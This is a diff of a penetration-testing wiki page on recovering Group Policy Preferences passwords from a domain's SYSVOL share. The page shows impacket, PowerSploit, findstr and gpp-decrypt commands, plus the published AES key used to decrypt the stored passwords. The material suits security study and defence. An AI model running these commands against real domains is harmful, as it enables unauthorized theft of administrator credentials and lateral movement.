@@ -6,17 +6,17 @@ description: MITRE ATT&CK™ Sub-technique T1552.006
 
 ## Theory
 
-Windows systems come with a built-in Administrator \(with an RID of 500\) that most organizations want to change the password of. This can be achieved in multiple ways but there is one that is to be avoided: setting the built-in Administrator's password through Group Policies.
+Windows systems come with a built-in Administrator (with an RID of 500) that most organizations want to change the password of. This can be achieved in multiple ways but there is one that is to be avoided: setting the built-in Administrator's password through Group Policies.
 
-* **Issue 1**: the password is set to be the same for every \(set of\) machine\(s\) the Group Policy applies to. If the attacker finds the admin's hash or password, he can gain administrative access to all \(or set of\) machines.
-* **Issue 2**: by default, knowing the built-in Administrator's hash \(RID 500\) allows for powerful [Pass-the-Hash](../../ntlm/pass-the-hash.md) attacks \([read more](../../ntlm/pass-the-hash.md#limitations-tips-and-tricks)\).
-* **Issue 3**: all Group Policies are stored in the Domain Controllers' `SYSVOL` share. All domain users have read access to it. This means all domain users can read the encrypted password set in Group Policy Preferences, and since Microsoft published the encryption key around 2012, the password can be decrypted🤷♂.
+* **Issue 1**: the password is set to be the same for every (set of) machine(s) the Group Policy applies to. If the attacker finds the admin's hash or password, he can gain administrative access to all (or set of) machines.
+* **Issue 2**: by default, knowing the built-in Administrator's hash (RID 500) allows for powerful [Pass-the-Hash](../../ntlm/pass-the-hash.md) attacks ([read more](../../ntlm/pass-the-hash.md#limitations-tips-and-tricks)).
+* **Issue 3**: all Group Policies are stored in the Domain Controllers' `SYSVOL` share. All domain users have read access to it. This means all domain users can read the encrypted password set in Group Policy Preferences, and since Microsoft published the encryption key around 2012, the password can be decrypted:man_shrugging:.
 
 ## Practice
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, the [Get-GPPPassword.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py) \(Python\) script in the impacket examples can be used to remotely parse `.xml` files and loot for passwords.
+From UNIX-like systems, the [Get-GPPPassword.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py) (Python) script in the impacket examples can be used to remotely parse `.xml` files and loot for passwords.
 
 ```bash
 # with a NULL session
@@ -29,9 +29,9 @@ Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
 Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
 ```
 
-Alternatively, searching for passwords can be done manually \(or with Metasploit's `smb_enum_gpp` module\), however it requires mounting the `SYSVOL` share, which can't be done through a docker environment unless it's run with privileged rights.
+Alternatively, searching for passwords can be done manually (or with Metasploit's `smb_enum_gpp` module), however it requires mounting the `SYSVOL` share, which can't be done through a docker environment unless it's run with privileged rights.
 
-Tools like [pypykatz](https://github.com/skelsec/pypykatz) \(Python\) and [gpp-decrypt](https://github.com/BustedSec/gpp-decrypt) \(Ruby\) can then be used to decrypt the matches.
+Tools like [pypykatz](https://github.com/skelsec/pypykatz) (Python) and [gpp-decrypt](https://github.com/BustedSec/gpp-decrypt) (Ruby) can then be used to decrypt the matches.
 
 ```bash
 # create the target directory for the mount
@@ -56,7 +56,7 @@ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 {% endtab %}
 
 {% tab title="Windows" %}
-From Windows systems, the GPP password can only be recovered from an authenticated \(i.e. domain user\) context \(see [impersonation](../impersonation.md)\).
+From Windows systems, the GPP password can only be recovered from an authenticated (i.e. domain user) context (see [impersonation](../impersonation.md)).
 
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)'s [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) searches a Domain Controller's SYSVOL share `Groups.xml`, `Services.xml`, `Scheduledtasks.xml`, `DataSources.xml`, `Printers.xml` and `Drives.xml` files and returns plaintext passwords
 
@@ -73,7 +73,7 @@ findstr /S cpassword %logonserver%\sysvol\*.xml
 
 The decryption process is as follows
 
-```text
+```
 1. decode from base64
 2. decrypt from AES-256-CBC the following hex key/iv
     Key : 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
@@ -91,7 +91,5 @@ The decryption process is as follows
 
 {% embed url="https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/" %}
 
-{% embed url="https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be" %}
-
-
+{% embed url="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be" %}
 
